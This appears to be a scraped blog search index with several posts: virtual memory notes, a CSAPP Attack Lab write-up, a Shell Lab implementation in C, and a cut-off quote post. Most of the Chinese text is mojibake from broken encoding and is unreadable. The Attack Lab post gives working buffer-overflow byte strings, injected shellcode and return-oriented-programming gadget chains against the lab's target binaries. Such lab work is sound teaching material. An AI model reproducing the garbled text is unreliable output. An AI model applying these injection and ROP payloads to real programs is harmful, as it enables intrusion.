åªéœ€è¦å‡è®¾ä¸€ä¸ªè™šæ‹Ÿçš„å†…å­˜æ¨¡å‹ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œé“¾æ¥å¥½æ‰€æœ‰çš„åœ°å€åï¼Œç”±ç›¸å…³çš„ç³»ç»Ÿå‘½ä»¤å’Œç¡¬ä»¶æŠŠè¿™äº›åœ°å€ç¿»è¯‘æˆ physical address å°±è¡Œäº†ã€‚ åŒæ—¶ï¼Œè™šæ‹Ÿå†…å­˜è¿˜å¯ä»¥ä½œä¸ºå†…å­˜ä¿æŠ¤çš„å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥ç»™æ¯ä¸ªè™šæ‹Ÿçš„ page åŠ ä¸Šå‡ ä¸ª flagsï¼Œæ¯”å¦‚ readableï¼Œwriteableï¼Œuser-stateï¼Œ kernel-state æ¥åŒºåˆ†æ¯ä¸ª process å¯¹ç›¸åº”çš„å®é™…å†…å­˜ä¸­æ•°æ®çš„å¤„ç†æƒé™ã€‚å¦‚ä¸‹é¢è¿™å¼ å›¾æ‰€ç¤ºï¼š What is virtuall memoryåœ¨ Why use virtual memory ä¸­å®é™…å·²ç»æåˆ°è¿‡äº†ï¼šä½¿ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ Virtual memory address å¯ä»¥ä½¿ç³»ç»Ÿå¯¹ç¡¬ä»¶å¼‚å¸¸ã€ç¡¬ä»¶åœ°å€ç¿»è¯‘ã€ä¸»å­˜ã€ç£ç›˜æ–‡ä»¶å’Œå†…æ ¸è½¯ä»¶çš„æŒæ§æ›´åŠ çš„å¿«æ·å’Œä¾¿åˆ©ã€‚ä½¿ç”¨è™šæ‹Ÿå†…å­˜å¯ä»¥ä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹æä¾›ä¸€ä¸ªéå¸¸å¤§çš„ã€ä¸€è‡´çš„åœ°å€ç©ºé—´ã€‚ é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯çœ‹çœ‹ physical addressï¼ˆon diskï¼‰æ˜¯æ€ä¹ˆä¸ main memory è”ç³»èµ·æ¥çš„ï¼Œphysical address ä¸ virtual address æ˜¯æ€ä¹ˆè½¬æ¢çš„ã€‚ å€Ÿç”¨ CSAPP çš„å†…å®¹ï¼š é‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹ä¸»è¦æ˜¯é€šè¿‡ MMU(memory manage unit) å’Œ ä¿å­˜åœ¨ main memory ä¸­çš„ PTE æ¥å®ç° MMU å…·æœ‰ä¸‹è¿°ç»“æ„ï¼š ä¸»è¦çš„åœ°å€å¯»æ‰¾æµç¨‹å¦‚ä¸‹ï¼š ä½¿ç”¨ TLB æ¥åŠ é€Ÿåœ°å€ç¿»è¯‘ï¼š How to ue itMain Memory address â†’ Cache addressConclutionReference [1] Computer system: A programmerâ€™s perspective. 3ed [2] Computer organization. Tang","link":"/2022/04/16/How%20memory%20system%20works/"},{"title":"[csapp] Lab3 Attack Lab","text":"Lab3 Attack Lab1. Introductionæ­¤å®éªŒç”¨æ¥ç†Ÿæ‚‰ï¼Œç†è§£ç¨‹åºè¿è¡Œçš„æ—¶å€™çš„ stack æ¨¡å‹ã€‚æ›´è¿›ä¸€æ­¥ç†è§£ stack ä¸Šå¯èƒ½å‘ç”Ÿçš„é”™è¯¯ï¼Œå¯¹å¸¸è§çš„æ”»å‡»æ‰‹æ®µæœ‰æ·±å…¥ç†è§£ã€‚ 2. ctarget(ä»£ç æ³¨å…¥)å¯¹äºæ²¡æœ‰è¿›è¡Œå¦‚ä¸‹é™åˆ¶çš„ç¨‹åºå¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥è¿›è¡Œæ”»å‡» ç”³è¯·çš„stackç©ºé—´ä¸æ˜¯éšæœºçš„ï¼Œæ˜¯å›ºå®šçš„ã€‚ ä½¿ç”¨äº†ä¸å®‰å…¨çš„å†™å…¥æ–¹æ³•ï¼Œæˆ–è€…ä½¿ç”¨äº†ä½çº§çš„ioï¼Œä¸”æ²¡æœ‰äººä¸ºçš„åˆ¤æ–­ç¼“å†²æº¢å‡ºçš„ç¨‹åº æ²¡æœ‰é™åˆ¶å†…å­˜ä¸­çš„æŸäº›stackåŒºåŸŸä¸­çš„æŒ‡ä»¤ä¸èƒ½è¢«æ‰§è¡Œã€‚ 2.1 Level 1è¦æ±‚å¯¹ buf çš„ç¼“å†²åŒºè¿›è¡Œæº¢å‡ºï¼Œè¿›è€Œè®© test å‡½æ•°ä¸ä¼šæ­£å¸¸è¿”å›ï¼Œè€Œæ˜¯è¿è¡Œåˆ° touch1 å‡½æ•°ã€‚æ˜¾ç„¶æˆ‘ä»¬éœ€è¦æŠŠ test æ ˆé¡¶çš„ ret æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®è¿›è¡Œè¦†ç›–ï¼Œæ¥æŒ‡å‘ touch1 å‡½æ•°ã€‚é€šè¿‡ objdump -d æŒ‡ä»¤ï¼Œå¾—åˆ° ctarget çš„æ±‡ç¼–ä»£ç ï¼Œæ‰¾åˆ° touch1 çš„ä½ç½®åœ¨ 00000000004017c0 &lt;touch1&gt; ã€‚åœ¨ lab ç»™å‡ºçš„ writeup ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ test å‡½æ•° c code å¦‚ä¸‹ï¼š 1234561 void test()2{3 int val;4 val = getbuf();5 printf(&quot;No exploit. Getbuf returned 0x%x\\n&quot;, val);6 } å…¶è°ƒç”¨äº† getbuf() å‡½æ•°ï¼Œ æŸ¥çœ‹è¯¥å‡½æ•°çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹: 12345678900000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop å¯ä»¥å¾—çŸ¥ï¼Œè¯¥å‡½æ•°åœ¨ stack ä¸­ç”³è¯·äº† 40 bytesï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ±¡æŸ“41â†’48 bytesã€‚æ˜¾ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æœ€ç®€å•çš„æ³¨å…¥ç¼–ç å¦‚ä¸‹ï¼š 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 å¯ä»¥ç”»å‡ºè¿™ä¸ªæ”»å‡»çš„æœ€ç»ˆå†…å­˜å½¢æ€å¦‚ä¸‹ï¼š Figure1: referenced from [1] 2.2 Level 2è¿™ä¸ªé¢˜ç›®è¦æ±‚ test å‡½æ•°ä¼šæ‰§è¡Œ touch2 å‡½æ•°ï¼Œ è€Œ touch2 å‡½æ•°éœ€è¦ä¸€ä¸ªå­˜å‚¨äº† cookie æ— ç¬¦å·æ•´å‹çš„ %rdiï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é¦–å…ˆæŠŠ %rdi å­˜å‚¨è¿™ä¸ª cookie å€¼ï¼Œ ç„¶åå†è·³è½¬åˆ° touch2 å‡½æ•°ã€‚ éœ€è¦ä½¿ç”¨åˆ° movq $(cookie), %rdi çš„æŒ‡ä»¤ï¼Œè¿™é‡Œ cookie ç”±ä¸‹è½½æ¥çš„ä½œä¸šä¸­çš„ cookie æ¥å®šã€‚ æ‰€ä»¥é¦–å…ˆå†™ä¸€ä¸ªåŒ…å«è¿™ä¸ªæŒ‡ä»¤çš„ x.s æ–‡ä»¶ï¼Œ ç„¶åä½¿ç”¨ gcc -c x.s æ¥å¾—åˆ° object æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ objdump -d æ¥å¾—åˆ°æœ€ç»ˆçš„æŒ‡ä»¤ä¸º 48 c7 c7 fa 97 69 59 ï¼Œ æ‰€ä»¥åŸºæœ¬çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼š movq $cookie, %rdi pushq (address of touch2) ret Aside è¿™é‡Œ ret å’Œ pushq çš„ä½œç”¨ä¼¼ä¹éå¸¸è®©äººç–‘æƒ‘ï¼Œä¸ºä»€ä¹ˆ ret ä¼šå›åˆ° pushq çš„åœ°å€ï¼Ÿè¿™é‡Œçš„ ret ä½¿ç”¨çš„æ˜¯è¿‘è¿”å›ï¼Œè¿‘è¿”å›çš„æ–¹æ³•æ˜¯æŠŠæ ˆé¡¶ä¹‹å€¼å¼¹å‡ºåˆ°æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨IPä¸­ï¼Œç„¶åä»è¿™ä¸ªå¼¹å‡ºçš„æŒ‡é’ˆå¤„è¿›è¡Œæ‰§è¡Œã€‚ Figurew: Referenced from [2] çœ‹å›¾ï¼Œè¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„æŒ‡ä»¤ï¼Œç¼–ç éƒ½ä¸ä¸€æ ·ã€‚retè¡¨ç¤ºè¿‘è¿”å›ï¼Œretfè¡¨ç¤ºè¿œè¿”å›ã€‚ æ‰€ä»¥ä½¿ç”¨ gcc -c æŒ‡ä»¤ç¼–ç å¦‚ä¸‹çš„ç¨‹åº 123movq $cookie, %rdi # change cookie to your own one.pushq %rspret è¿™é‡Œå°±éœ€è¦æ‰¾åˆ° getbuf çš„æ ˆé¡¶åœ¨å“ªé‡Œï¼Œæˆ‘ä»¬éœ€è¦æŠŠ test å‡½æ•°çš„ ret å‡½æ•°çš„ ret address æ¢æˆ getbuf çš„ æ ˆé¡¶ã€‚ä½¿ç”¨ gdb è°ƒè¯•ï¼Œ æŠŠæ–­ç‚¹æ‰“åœ¨ getbuf åˆå§‹åŒ–å®Œ %rsp çš„ä½ç½®ã€‚ç„¶å run -q è¿è¡Œï¼Œå¹¶ä½¿ç”¨ info r rsp å¾—åˆ°å¯„å­˜å™¨ç›®å‰å­˜å‚¨çš„åœ°å€ä¿¡æ¯ã€‚å¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„ç­”æ¡ˆã€‚ 12345648 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 å¯ä»¥ç”»å‡ºè¿™ä¸ªæ”»å‡»çš„æœ€ç»ˆå†…å­˜å½¢æ€å¦‚ä¸‹ï¼š Figure3: Referenced from [1] 2.3 Level 3è¿™ä¸ªé¢˜ç›®è¦æ±‚ test å‡½æ•°ä¼šæ‰§è¡Œ touch3 å‡½æ•°ï¼Œ è€Œ touch3 å‡½æ•°éœ€è¦ä¸€ä¸ªå­˜å‚¨äº† cookie å­—ç¬¦ä¸²çš„ %rdiï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é¦–å…ˆæŠŠ %rdi å­˜å‚¨è¿™ä¸ª cookie å­—ç¬¦ä¸²çš„æŒ‡é’ˆå€¼ï¼Œ ç„¶åå†è·³è½¬åˆ° touch3 å‡½æ•°ã€‚ æ‰€ä»¥è¿™é‡Œçš„æ€è·¯å°±æ˜¯éœ€è¦æŠŠ å­—ç¬¦ä¸²é¦–å…ˆå­˜å‚¨åˆ°ä¸€ä¸ªä½ç½®ï¼Œ ç„¶åæŠŠè¿™ä¸ªä½ç½®çš„é¦–åœ°å€ä¼ ç»™ %rdiï¼Œ ç„¶åè¿›å…¥åˆ° touch3 å‡½æ•°æ‰§è¡Œã€‚ ï¼ä½†æ˜¯è¿™é‡Œ writeup è®©æˆ‘ä»¬æ³¨æ„çš„æ˜¯å½“è°ƒç”¨hexmatchå’Œstrncmpæ—¶ï¼Œä»–ä»¬ä¼šæŠŠæ•°æ®å‹å…¥åˆ°æ ˆä¸­ï¼Œæœ‰å¯èƒ½ä¼šè¦†ç›–getbufæ ˆå¸§çš„æ•°æ®ï¼Œæ‰€ä»¥ä¼ è¿›å»å­—ç¬¦ä¸²çš„ä½ç½®å¿…é¡»å°å¿ƒè°¨æ…ã€‚hexmatch å¼€è¾Ÿäº†110å­—èŠ‚çš„æ ˆå¸§ï¼Œstrncmp ä¹Ÿä¼šå¼€è¾Ÿç©ºé—´ï¼Œä½†æ˜¯å°±ä»£ç æ¥çœ‹ï¼Œ*så­˜æ”¾çš„åœ°å€æ˜¯éšæœºçš„ï¼Œå¦‚æœæˆ‘ä»¬å°†æ•°æ®æ”¾åœ¨ getbuf çš„æ ˆç©ºé—´é‡Œé¢ï¼Œå¾ˆæœ‰å¯èƒ½å°±è¢«è¿™ä¸¤ä¸ªå‡½æ•°è¦†ç›–äº†ã€‚æ‰€ä»¥åœ¨è¿™é‡Œçš„æ€è·¯æ˜¯ï¼ŒæŠŠå­—ç¬¦ä¸²ä¼ å…¥åˆ° callerâ†’test çš„stack åŒºåŸŸä¸­ï¼Œè¿™æ ·å­—ç¬¦ä¸²å¯ä»¥é¿å…è¢«è¦†ç›–ã€‚ ï¼å¯¹äº ascii ç ï¼Œ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ man ascii æ¥æŸ¥çœ‹å¯¹åº” ascii ç çš„ hex å½¢å¼ã€‚ ï¼å­—ç¬¦ä¸² å¿…é¡»ä»¥ \\0 ç»“å°¾ã€‚ é‚£ä¹ˆå¯¹åº”çš„æ€è·¯å¦‚ä¸‹ï¼š æŠŠ å­—ç¬¦ä¸² ä¼ å…¥åˆ° test æ ˆåŒºä¸­ã€‚ æŠŠ å­—ç¬¦ä¸²çš„æŒ‡é’ˆ ä¼ ç»™ %rdi pushq touch3 åœ°å€ ret è‡³äºæ€ä¹ˆå–åˆ°å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œæ€ä¹ˆå¾—åˆ°è¿™äº›æŒ‡ä»¤çš„ç¼–ç ï¼Œä¸ section 2.2 ä¸­ä¸€è‡´ã€‚ 1234567848 c7 c7 a8 dc 61 55 68 # mov and pushfa 18 40 00 c3 00 00 00 # push and ret00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 # pointer to test stack top35 39 62 39 39 37 66 61 # string of cookie00 # '\\0' for string. å¯ä»¥ç”»å‡ºè¿™ä¸ªæ”»å‡»çš„æœ€ç»ˆå†…å­˜å½¢æ€å¦‚ä¸‹ï¼š Figure4: Referenced from [1] 3. rtarget(Return-Oriented Programming)åœ¨ section 2 ctarget ä¸­ä¸‰æ¡éƒ½è¢«å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œåªèƒ½ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ã€‚ 3.0 review åœ¨æ ˆä½¿ç”¨äº† randomization æ¥åˆå§‹åŒ– stack frame å¤§å°ï¼›é™åˆ¶äº† memory ä¸­ stack æŸäº›åŒºå—çš„ä»£ç æ‰§è¡Œæƒé™çš„æƒ…å†µä¸‹ï¼Œéœ€è¦ä½¿ç”¨ Return-Oriented Programming çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„åŸºæœ¬æƒ³æ³•å°±æ˜¯ä½¿ç”¨å·²ç»å­˜åœ¨çš„æŒ‡ä»¤æ¥ä½œä¸ºè‡ªå·±çš„æŒ‡ä»¤æ‰§è¡Œï¼Œä»è€Œç»•å¼€ stack åŒºåŸŸä¸­çš„é™åˆ¶ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œå¯ä»¥ä½¿ç”¨çš„æŒ‡ä»¤åé¢éœ€è¦è·Ÿæœ‰ä¸€ä¸ª ret æ¥è¿”å›ï¼Œé€šè¿‡ä¸€ç³»åˆ—çš„æŒ‡ä»¤ [op, ret]-&gt;[op, ret]-&gt;... å¯ä»¥å½¢æˆä¸€ä¸ª listï¼Œ è¿™ä¸ªå½¢ä¼¼å•é“¾è¡¨çš„ç»“æ„å°±æ˜¯æˆ‘ä»¬çš„æŒ‡ä»¤çš„ç»„æˆã€‚ æ¯”å¦‚ä¸‹é¢çš„è¿™ä¸ªå…·ä½“çš„ä¾‹å­ï¼š æœ‰å¦‚ä¸‹çš„ c code 123void setval_210(unsigned *p){*p = 3347663060U;} å¾—åˆ° assembly codeï¼š 1230000000000400f15 &lt;setval_210&gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq ä¸Šé¢è¿™ä¸ª assembly code å°±å¯ä»¥ä½œä¸ºæˆ‘ä»¬çš„ list ä¸­çš„ä¸€ä¸ª nodeã€‚ æ¯”å¦‚ 48 89 c7 å°±æ˜¯ movl %rax, %rdi çš„ä¸€ä¸ªæŒ‡ä»¤ä»£ç ï¼Œå¹¶ä¸”å·²ç»å­˜åœ¨äº å¯æ‰§è¡Œä»£ç å—ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®© pc(program counter) æŒ‡å‘è¿™ä¸ªä½ç½® 0x400f15 + 4 æ¥æŒ‡å‘è¿™ä¸ª movl æŒ‡ä»¤ï¼Œåœ¨æ‰§è¡Œå®Œä»¥åéœ€è¦ç«‹å³ retï¼Œç„¶åæ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ª nodeã€‚ 3.1 Level 2è¿™ä¸ªé¢˜ç›®è®©æˆ‘ä»¬åšçš„å’Œä¸Šä¸€ä¸ª ctarget ä¸­çš„ level 2 ä¸€è‡´ã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦ä½¿ç”¨ gadget list æ¥ç»„æˆæ‰€æœ‰éœ€è¦çš„æŒ‡ä»¤ã€‚æ ¹æ®ä¹‹å‰çš„æ€è·¯ï¼Œæˆ‘ä»¬æ˜¯ç›´æ¥æŠŠ cookie å­˜å‚¨åˆ° %rdiï¼Œéœ€è¦ä½¿ç”¨åˆ° movq å’Œ pop æŒ‡ä»¤ã€‚æ ¹æ® writeup çš„æç¤ºï¼Œè¿™æ˜¯å¯ä»¥è¢«ä½¿ç”¨çš„ gadget nodeï¼š 1234567891011121314151617181920212223242526272829303132333435363738390000000000000000 &lt;start_farm&gt;: 0: b8 01 00 00 00 mov $0x1,%eax 5: c3 retq 0000000000000006 &lt;getval_142&gt;: 6: b8 fb 78 90 90 mov $0x909078fb,%eax b: c3 retq 000000000000000c &lt;addval_273&gt;: c: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 12: c3 retq 0000000000000013 &lt;addval_219&gt;: 13: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 19: c3 retq 000000000000001a &lt;setval_237&gt;: 1a: c7 07 48 89 c7 c7 movl $0xc7c78948,(%rdi) 20: c3 retq 0000000000000021 &lt;setval_424&gt;: 21: c7 07 54 c2 58 92 movl $0x9258c254,(%rdi) 27: c3 retq 0000000000000028 &lt;setval_470&gt;: 28: c7 07 63 48 8d c7 movl $0xc78d4863,(%rdi) 2e: c3 retq 000000000000002f &lt;setval_426&gt;: 2f: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 35: c3 retq 0000000000000036 &lt;getval_280&gt;: 36: b8 29 58 90 c3 mov $0xc3905829,%eax 3b: c3 retq 000000000000003c &lt;mid_farm&gt;: 3c: b8 01 00 00 00 mov $0x1,%eax 41: c3 retq è€Œæˆ‘ä»¬éœ€è¦çš„ä»£ç æ˜¯ï¼š 12popq %raxmovq %rax, %rdi popq %raxçš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š58ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†å¦‚ä¸‹å‡½æ•°ï¼š 12300000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 ä»ä¸­æˆ‘ä»¬å¯ä»¥å¾—å‡ºpopq %raxæŒ‡ä»¤çš„åœ°å€ä¸ºï¼š0x4019ab movq %rax, %rdiçš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š48 89 c7ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†å¦‚ä¸‹å‡½æ•°ï¼š 12300000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 ä»ä¸­æˆ‘ä»¬å¯ä»¥å¾—å‡ºmovq %rax, %rdiæŒ‡ä»¤çš„åœ°å€ä¸ºï¼š0x4019a2 æœ€ç»ˆå¯ä»¥å¾—å‡ºéœ€è¦çš„æŒ‡ä»¤ä¸º 12345678900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00 # popq %raxfa 97 b9 59 00 00 00 00 # cookie need for movq, will be poped to %rax.a2 19 40 00 00 00 00 00 # movqec 17 40 00 00 00 00 00 # touch2 3.2 Level 3è¿™ä¸ªé¢˜ç›®è®©æˆ‘ä»¬åšçš„å’Œä¸Šä¸€ä¸ª ctarget ä¸­çš„ level 3 ä¸€è‡´ã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦ä½¿ç”¨ gadget list æ¥ç»„æˆæ‰€æœ‰éœ€è¦çš„æŒ‡ä»¤ã€‚ å› ä¸ºæ¯æ¬¡æ ˆçš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ç”¨åœ°å€æ¥ç´¢å¼•å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼Œåªèƒ½ç”¨æ ˆé¡¶åœ°å€ + åç§»é‡æ¥ç´¢å¼•å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ã€‚å¯¹äºè·å¾—åç§»é‡çš„æ“ä½œï¼Œleaq(, , ),%rax è¿™ä¸ªæ“ä½œæ˜¯ gcc ç»å¸¸ç”¨æ¥è·å¾—åç§»é‡çš„ä¸€ä¸ªæŒ‡ä»¤ã€‚ æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹é¢çš„æ–¹æ³•ï¼š ï¼ˆ1ï¼‰é¦–å…ˆè·å–åˆ°%rspçš„åœ°å€ï¼Œå¹¶ä¸”ä¼ é€åˆ°%rdiï¼ˆ2ï¼‰å…¶äºŒè·å–åˆ°å­—ç¬¦ä¸²çš„åç§»é‡å€¼ï¼Œå¹¶ä¸”ä¼ é€åˆ°%rsiï¼ˆ3ï¼‰lea (%rdi,%rsi,1),%rax, å°†å­—ç¬¦ä¸²çš„é¦–åœ°å€ä¼ é€åˆ°%rax, å†ä¼ é€åˆ°%rdiï¼ˆ4ï¼‰è°ƒç”¨touch3å‡½æ•° å…·ä½“çš„ geaget ä»frame.c å‡½æ•°çš„ dump æ–‡ä»¶ä¸­æ‰¾åˆ°å°±è¡Œ æœ€ç»ˆçš„ç­”æ¡ˆæ˜¯ï¼š 1234567891011121314151600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00ab 19 40 00 00 00 00 0048 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0034 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 61 Reference [1] https://www.jianshu.com/p/db731ca57342 [2] https://www.zhihu.com/question/364589259","link":"/2022/02/11/%5Bcsapp%5D%20Lab3%20Attack%20Lab/"},{"title":"[csapp] Lab5 Shell Lab","text":"Lab5 Shell LabIntroductionIn this lab, we need to implement a simple Unix style shell program. The file we only need to modify is tsh.c in handout package. We should implement those functions: eval parse and execute the instruction that user has inputted. builtin_cmd check if the command inputted is a inner build command. Such as quit fg bg do_bgfg It define the behaviors how to execute back ground and front ground command. waitfg wait until the front ground program done. sigchld_handler process SIGCHLD signal, when son process stopped or terminated. sigint_handler process SIGINT signal, interrupt from keyboard ctrl-c. sigstp_handler process SIGTSTP signal, interrupt from keyboard ctrl-z. You can use make test(n) to test your shell program on n-th test set. For example, if you have implemented all functions this lab required. You can use make test15 to test your tsh. Methods1. evalJust borrowed the code from csapp ğŸ™‚. A quick review of signal process function. If you want to use those functions, you need include signal.h first. int sigprocmask(int how, const sigset_t *set, sigset_t *oldset) Use how to tell function, which way we want to change the blocked signal set. If how = SIG_BLOCK, blocked = blocked | set if how = SIG_UNBLOCK, blocked = blocked &amp; ~set if how = SETMASK, block = set if oldset is not empty, the previous blocked status will be stored in oldset, for recovery purpose. int sigemptyset(sigset_t *set) Init set to 0. int sigfillset(sigset_t *set) Get current signals. int sigaddset(sigset_t *set, int signum) Add signum to signal set. int sigdelset(sigset_t *set, int signum) Delete signum from signal set. int sigismember(const sigset_t *set, int signum) If signum in signal set, return 1 else return 0. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849void eval(char *cmdline) { char *argv[MAXARGS]; char buf[MAXLINE]; int bg; int state; pid_t pid; sigset_t mask_all, mask_one, prev; strcpy(buf, cmdline); bg = parseline(buf, argv); // this function is exists in this lab's code if (argv[0] == NULL) // is there are no command to process. just return. return ; if(!builtin_cmd(argv)) { sigfillset(&amp;mask_all); // get current mask sigemptyset(&amp;mask_one); // init, set mask_one to 0 sigaddset(&amp;mask_one, SIGCHLD); // Add SIGCHLD signal to mask_one set. sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev); // blocked = bloked | mask_one if ((pid = fork()) == 0) { sigprocmask(SIG_SETMASK, &amp;prev, NULL); if (setpgid(0, 0) &lt; 0) { perror(&quot;SETPGID ERROR&quot;); exit(0); } if (execve(argv[0], argv, environ) &lt; 0) { printf(&quot;%s: Command not found\\n&quot;, argv[0]); exit(0); } } else { state = bg ? BG : FG; sigprocmask(SIG_BLOCK, &amp;mask_all, NULL); addjob(jobs, pid, state, cmdline); sigprocmask(SIG_SETMASK, &amp;prev, NULL); } if (!bg) waitfg(pid); else printf(&quot;[%d] (%d) %s&quot;,pid2jid(pid), pid, cmdline); } return;} 2. builtin_cmd123456789101112131415161718192021int builtin_cmd(char **argv) { if (!strcmp(argv[0], &quot;quit&quot;)) exit(0); else if (!strcmp(argv[0], &quot;jobs&quot;)) { listjobs(jobs); return 1; } else if (!strcmp(argv[0], &quot;bg&quot;) || !strcmp(argv[0], &quot;fg&quot;)) { do_bgfg(argv); return 1; } else if (!strcmp(argv[0], &quot;&amp;&quot;)) { return 1; } return 0; /* not a builtin command */} 3. do_bgfg123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051void do_bgfg(char **argv) { if (argv[1] == NULL) { printf(&quot;%s command requires PID or %%jobid argument\\n&quot;, argv[0]); return; } struct job_t* job; int id; if (sscanf(argv[1], &quot;%%%d&quot;, &amp;id) &gt; 0) { job = getjobjid(jobs, id); if (job == NULL) { printf(&quot;%%%d: No such job\\n&quot;, id); return ; } } else if (sscanf(argv[1], &quot;%d&quot;, &amp;id) &gt; 0) { job = getjobpid(jobs, id); if (job == NULL) { printf(&quot;(%d): No such process\\n&quot;, id); return ; } } else { printf(&quot;%s: argument must be a PID or %%jobid\\n&quot;, argv[0]); return; } if(!strcmp(argv[0], &quot;bg&quot;)) { kill(-(job-&gt;pid), SIGCONT); job-&gt;state = BG; printf(&quot;[%d] (%d) %s&quot;,job-&gt;jid, job-&gt;pid, job-&gt;cmdline); } else { kill(-(job-&gt;pid), SIGCONT); job-&gt;state = FG; waitfg(job-&gt;pid); } return;} 4. waitfg1234sigset_t mask_temp;sigemptyset(&amp;mask_temp);while (fgpid(jobs) &gt; 0) sigsuspend(&amp;mask_temp);return; 5. sigchld_handler1234567891011121314151617181920212223242526272829303132333435void sigchld_handler(int sig) { int olderrno = errno; pid_t pid; int status; sigset_t mask_all, prev; sigfillset(&amp;mask_all); while((pid = waitpid(-1, &amp;status, WNOHANG | WUNTRACED)) &gt; 0) { if (WIFEXITED(status)){ sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev); deletejob(jobs, pid); sigprocmask(SIG_SETMASK, &amp;prev, NULL); } else if (WIFSIGNALED(status)) { struct job_t* job = getjobpid(jobs, pid); sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev); printf(&quot;Job [%d] (%d) terminated by signal %d\\n&quot;, job-&gt;jid, job-&gt;pid, WTERMSIG(status)); deletejob(jobs, pid); sigprocmask(SIG_SETMASK, &amp;prev, NULL); } else { struct job_t* job = getjobpid(jobs, pid); sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev); printf(&quot;Job [%d] (%d) stopped by signal %d\\n&quot;, job-&gt;jid, job-&gt;pid, WSTOPSIG(status)); job-&gt;state= ST; sigprocmask(SIG_SETMASK, &amp;prev, NULL); } } errno = olderrno; return;} 6. sigint_handler12345678910void sigint_handler(int sig) { int olderrno = errno; pid_t pid = fgpid(jobs); if (pid != 0) kill(-pid, sig); errno = olderrno; return;} If ctrl-c is pressed, you should kill all front ground process. 7. sigtstp_handler123456789void sigtstp_handler(int sig) { int olderrno = errno; pid_t pid = fgpid(jobs); if (pid != 0) kill(-pid, sig); errno = olderrno; return;} If ctrl-z is pressed, you should kill all front ground process.","link":"/2022/03/17/%5Bcsapp%5D%20Lab5%20Shell%20Lab/"},{"title":"quote-JiXianlin","text":"ä»Šå¤©ä»ç„¶æ‹¼å‘½çœ‹ä¹¦ï¼Œå› ä¸ºæ˜å¤©å°±è¦è€ƒäº†ã€‚å­¦æœŸçš„æˆç»©å°±å…¨ä»—è¿™ä¸¤å¤©æŒ£ï¼Œç°åœ¨æ›´æ„Ÿåˆ°è€ƒè¯•æ— ç”¨ä¸æ— 